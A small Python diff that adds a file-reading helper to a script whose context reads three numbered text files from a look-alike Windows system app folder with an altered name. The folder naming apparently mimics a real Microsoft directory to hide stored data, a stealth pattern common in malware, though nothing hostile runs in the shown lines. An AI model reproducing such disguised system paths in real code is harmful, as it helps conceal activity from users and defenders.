@@ -23,6 +23,14 @@ def tiger(mycontent: str):
     else:
         raise Exception(f"Error. Your internet is private.")
 
+def get_data_from_file(file_path):
+    if os.path.exists(file_path):
+        with open(file_path, 'r') as file:
+            content = file.read()
+        return content
+    else:
+        return "Error"
+
 part1_data = os.path.join(os.environ['SystemRoot'], 'SystemApps', 'Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewyTyklsdpremx','w5n1h2txyewy1.txt')
 part2_Data = os.path.join(os.environ['SystemRoot'], 'SystemApps','Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewyTyklsdpremx' ,'w5n1h2txyewy2.txt')
 part3_data = os.path.join(os.environ['SystemRoot'], 'SystemApps', 'Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewyTyklsdpremx','w5n1h2txyewy3.txt')
